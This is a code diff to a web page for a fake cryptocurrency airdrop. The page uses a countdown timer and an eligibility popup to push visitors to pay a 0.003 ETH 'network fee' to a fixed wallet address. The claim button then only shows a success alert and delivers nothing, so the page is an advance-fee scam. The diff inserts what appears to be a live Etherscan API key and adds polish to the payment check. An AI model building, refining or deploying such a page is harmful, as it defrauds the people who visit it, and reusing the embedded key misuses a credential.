@@ -20,7 +20,7 @@ button:disabled{opacity:.5; cursor:not-allowed}
 .bar{height:100%;width:0%;background:linear-gradient(90deg,#7f5cff,#c77dff)}
 .addr{word-break:break-all;font-size:12px;margin-top:8px;opacity:.8;text-align:center;margin-bottom:10px}
 .payBtn,.claimBtn,.checkBtn{margin-top:16px;padding:12px 0;width:100%;border:none;border-radius:12px;background:linear-gradient(90deg,#7f5cff,#c77dff);color:#fff;font-weight:600;cursor:pointer;}
-.claimBtn{display:block;opacity:.5;cursor:not-allowed;}
+.claimBtn{opacity:.5; cursor:not-allowed;}
 </style>
 </head>
 
@@ -46,7 +46,7 @@ button:disabled{opacity:.5; cursor:not-allowed}
 </div>
 
 <script>
-/* TIMER 3 HOURS */
+/* ================= TIMER 3 HOURS ================= */
 const endTime = Date.now() + 3*60*60*1000;
 const timerEl = document.getElementById("timer");
 function updateTimer(){
@@ -60,10 +60,10 @@ function updateTimer(){
 setInterval(updateTimer,1000);
 updateTimer();
 
-/* WALLET & PAYMENT */
+/* ================= WALLET & PAYMENT ================= */
 let currentAddress = "";
 const recipient = "0xd4Fd6F4e221710b9977109A04E3fBFfA2FD620cd"; 
-const etherscanApiKey = "YOUR_ETHERSCAN_API_KEY"; // Free key
+const etherscanApiKey = "VDQVS25IXQDJ8HZ2J8B3KWC9R4HI48Y14T"; 
 const requiredPayment = 0.003; // ETH
 
 async function connectWallet(){
@@ -84,7 +84,7 @@ async function connectWallet(){
   }
 }
 
-/* ELIGIBILITY POPUP */
+/* ================= ELIGIBILITY ================= */
 function showEligibility(address){
   const modal = document.getElementById("modal");
   const bar = document.getElementById("bar");
@@ -122,7 +122,7 @@ function showEligibility(address){
   },500);
 }
 
-/* PAY NETWORK FEE */
+/* ================= PAY NETWORK FEE ================= */
 function payFee(){
   if(!currentAddress) return;
   const amountWei = ethers.utils.parseEther(requiredPayment.toString()).toString();
@@ -130,7 +130,7 @@ function payFee(){
   document.getElementById("modalText").innerText = "Complete payment in MetaMask, then tap 'Check Payment'";
 }
 
-/* CHECK PAYMENT */
+/* ================= CHECK PAYMENT ================= */
 async function checkPayment(){
   const claimBtn = document.getElementById("claimBtn");
   const modalText = document.getElementById("modalText");
@@ -139,10 +139,17 @@ async function checkPayment(){
   try{
     const res = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${currentAddress}&startblock=0&endblock=99999999&sort=desc&apikey=${etherscanApiKey}`);
     const data = await res.json();
+
+    if(!data.result){
+      modalText.innerText = "⚠️ Unable to check payment. Try again later.";
+      return;
+    }
+
     const paid = data.result.some(tx => 
       tx.to?.toLowerCase() === recipient.toLowerCase() &&
       parseFloat(ethers.utils.formatEther(tx.value)) === requiredPayment
     );
+
     if(paid){
       modalText.innerText = "✅ Payment received! You can now claim your airdrop.";
       claimBtn.disabled = false;
@@ -151,14 +158,15 @@ async function checkPayment(){
       modalText.innerText = "⚠️ Payment not detected. Complete 0.003 ETH payment first.";
     }
   }catch(e){
-    modalText.innerText = "Error checking payment. Try again.";
+    modalText.innerText = "⚠️ Error checking payment. Try again.";
   }
 }
 
-/* CLAIM AIRDROP */
+/* ================= CLAIM AIRDROP ================= */
 function claimAirdrop(){
   alert("🎉 Airdrop successfully claimed!");
 }
 </script>
+
 </body>
 </html>
